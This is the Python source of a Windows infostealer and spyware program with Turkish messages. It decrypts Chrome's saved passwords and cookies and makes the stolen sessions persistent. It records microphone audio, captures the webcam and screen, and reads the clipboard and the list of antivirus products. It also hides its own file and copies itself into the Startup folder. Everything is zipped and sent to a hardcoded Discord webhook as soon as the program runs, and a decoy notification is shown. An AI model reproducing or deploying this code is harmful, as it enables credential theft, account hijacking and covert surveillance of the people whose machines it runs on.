import socket, os, cv2, pyautogui, subprocess, ctypes, sys, shutil, time, requests, pyperclip, sqlite3, base64, json, pyaudio, wave, zipfile, wmi

from datetime import datetime, timedelta

import win32crypt
from Crypto.Cipher import AES
from win10toast import ToastNotifier
from colorama import Fore


def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def save_cookies_to_txt(cookies):
    with open("cookies.txt", "w", encoding="utf-8") as file:
        for cookie_data in cookies:
            file.write(cookie_data + "\n\n")


def cookie(webhook):
    subprocess.call(["taskkill", "/F", "/IM", "chrome.exe"])
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Network", "Cookies")

    filename = "Cookies.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()

    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")

    key = get_encryption_key()
    cookies = []
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            decrypted_value = value
        cookie_data = (f"""
        Host: {host_key}
        Cookie name: {name}
        Cookie value (decrypted): {decrypted_value}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================""")
        cookies.append(cookie_data)
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    # commit changes
    db.commit()
    # close connection
    db.close()

    os.remove("Cookies.db")

    # Save cookies to a text file
    save_cookies_to_txt(cookies)

    # Send cookies file via webhook
    webhook_url = webhook
    files = {"file": open("cookies.txt", "rb")}
    response = requests.post(webhook_url, files=files)

    if response.status_code == 200:
        Functions.notification("Üzgünüz!", "Ne olduğunu bizde anlamadık...")
        return f"Succsefully sent the cookies file via webhook!"
    else:
        os.remove("cookies.txt")
        return f"Failed to send the cookies file via webhook!"


def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def save_passwords_to_txt(passwords):
    with open("passwords.txt", "w", encoding="utf-8") as file:
        for password_data in passwords:
            file.write(password_data + "\n\n")


def main():
    results = []
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            result = f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\n"
            if date_created != 86400000000 and date_created:
                result += f"Creation date: {str(get_chrome_datetime(date_created))}\n"
            if date_last_used != 86400000000 and date_last_used:
                result += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
            results.append(result)

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    return results


def send_passwords_via_webhook(webhook):
    passwords = main()
    save_passwords_to_txt(passwords)
    # Send passwords file via webhook
    webhook_url = webhook
    files = {"file": open("passwords.txt", "rb")}
    response = requests.post(webhook_url, files=files)

    if response.status_code == 200:
        Functions.notification("Üzgünüz!", "Ne olduğunu bizde anlamadık...")
        return "Successfully sent the passwords file via webhook!"
    else:
        os.remove("passwords.txt")
        return "Failed to send the passwords file via webhook!"


class Functions:
    def voice(self, webhook_url):
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        RECORD_SECONDS = 5
        WAVE_OUTPUT_FILENAME = "output.wav"

        audio = pyaudio.PyAudio()

        stream = audio.open(format=FORMAT,
                            channels=CHANNELS,
                            rate=RATE,
                            input=True,
                            frames_per_buffer=CHUNK)

        frames = []

        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))

        ses = b''.join(frames)

        webhook_url = webhook_url

        with open(WAVE_OUTPUT_FILENAME, 'rb') as file:
            files = {'file': (WAVE_OUTPUT_FILENAME, file, 'audio/wav')}
            response = requests.post(webhook_url, files=files)

        if response.status_code == 200:
            return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"
        else:
            return f"{Fore.RED}Can't sent the voice your webhook url{Fore.RESET}"

    def steal_password(self, data):
        try:
            return send_passwords_via_webhook(data)
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def steal_cookie(self, data):
        try:
            return cookie(data)
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def tasklist(self):
        try:
            self.result = subprocess.run(["tasklist"], capture_output=True, text=True)
            return f"{self.result.stdout}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def hide_program(self, data):
        try:
            ctypes.windll.kernel32.SetFileAttributesW(data, 2)
            return f"{Fore.GREEN}Succsessfully hideing the {data}{Fore.RESET}"

        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def startup(self):
        try:
            self.program_adi = os.path.basename(sys.argv[0])
            self.hedef_dizin = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            self.program_yolu = os.path.abspath(sys.argv[0])
            try:
                self.hedef_yol = os.path.join(self.hedef_dizin, self.program_adi)
                if not os.path.exists(self.hedef_yol):
                    shutil.copy(self.program_yolu, self.hedef_yol)
                    return f"{self.program_adi} başlangıç klasörüne kopyalandı."
                else:
                    return f"{Fore.RED}Error! {self.program_adi} It already has original parts.{Fore.RESET}"
            except Exception as e:
                return f"{Fore.RED}Error! {e}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def clipboard(self):
        try:
            self.copied_text = pyperclip.paste()
            return self.copied_text
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def notification(self, title, content):
        try:
            toaster = ToastNotifier()
            toaster.show_toast(f"{title}", f"{content}", duration=5, threaded=True)
            return f"{Fore.GREEN}Succsesfully sent the notification!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def get_antivirus_products(self):
        c = wmi.WMI()
        antivirus_products = []

        for product in c.Win32_Product():
            if 'antivirus' in product.Name.lower():
                antivirus_products.append(product.Name)

        return antivirus_products

    def all(self, webhook, computer_name):
        try:
            screenshot = pyautogui.screenshot("screenshot.png")
            self.kameraa = cv2.VideoCapture(0)

            ret, frame = self.kameraa.read()

            if ret:
                cv2.imwrite("photo.jpg", frame)
            else:
                print(f"{Fore.RED}Kamera açılamadı!{Fore.RESET}")

            self.kameraa.release()

            Functions.voice("https://www.example.com/")
            Functions.steal_password(data=" ")
            Functions.steal_cookie(data=" ")
            Functions.hide_program(sys.argv[0])

            with open("tasklist.txt", "w") as tasklist:
                tasklist.write(str(Functions.tasklist()))

            tasklist.close()

            with open("clipboard.txt", "w") as clipboard:
                clipboard.write(str(Functions.clipboard()))

            clipboard.close()

            with open("defender.txt", "w") as defender:
                defender.write(str(Functions.get_antivirus_products()))

            defender.close()

            with open("list.txt", "w") as list:
                list.write(str(os.listdir()))

            list.close()

            with open("directory.txt", "w") as directory:
                directory.write(os.getcwd())

            directory.close()


            if os.path.exists("cookies.txt"):
                pass
            else:
                Functions.steal_cookie(data=" ")

            with zipfile.ZipFile(f"{computer_name}.zip", "w") as zipf:
                zipf.write("tasklist.txt")
                zipf.write("clipboard.txt")
                zipf.write("defender.txt")
                zipf.write("output.wav")
                zipf.write("photo.jpg")
                zipf.write("screenshot.png")
                zipf.write("passwords.txt")
                zipf.write("cookies.txt")
                zipf.write("list.txt")
                zipf.write("directory.txt")
                if not os.path.exists("cookies.txt"):
                    zipf.write("cookies.txt")
                else:
                    pass

            zipf.close()

            url = webhook
            files = {'file': open(f'{computer_name}.zip', 'rb')}
            response = requests.post(url, files=files)

            while True:
                if response.status_code == 200:
                    break
                else:
                    print(f"{Fore.RED}Internet connection!{Fore.RESET}")
                    response = requests.post(url, files=files)
                    time.sleep(2)
                    break

        except FileNotFoundError as file:
            message = f"Error! File Not Found! ({file})"

            payload = {
                "content": message
            }

            headers = {
                "Content-Type": "application/json"
            }

            response = requests.post(webhook, data=json.dumps(payload), headers=headers)

        except Exception as e:
            print(f"{Fore.RED}Error! {e}{Fore.RESET}")

            message = f"Error! {e}"

            payload = {
                "content": message
            }

            headers = {
                "Content-Type": "application/json"
            }

            response = requests.post(webhook, data=json.dumps(payload), headers=headers)

        finally:
            pass

Functions = Functions()

class Main:
    computer_name = socket.gethostname()

    webhook = "https://discord.com/api/webhooks/1217526873932824597/r0HTVunZExlyg672N1vE4kD9gm77dbj7qtACVtd_Rs8dKidl0sLLcM5Ip9Y6BNg_a5Ly"

    message = f"{computer_name} opened!"

    payload = {
        "content": message
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook, data=json.dumps(payload), headers=headers)

    Functions.all(webhook, computer_name)
    Functions.startup()

    file = ["screenshot.png", "passwords.txt", "cookies.txt", "list.txt", "directory.txt", f"{computer_name}.zip", "photo.jpg", "output.wav", "defender.txt", "defender.txt", "clipboard.txt", "tasklist.txt"]
    for dosya in file:
        if os.path.exists(dosya):
            os.remove(dosya)
        else:
            pass

    if os.path.exists(f"{computer_name}.zip"):
        os.remove(f"{computer_name}.zip")
    else:
        pass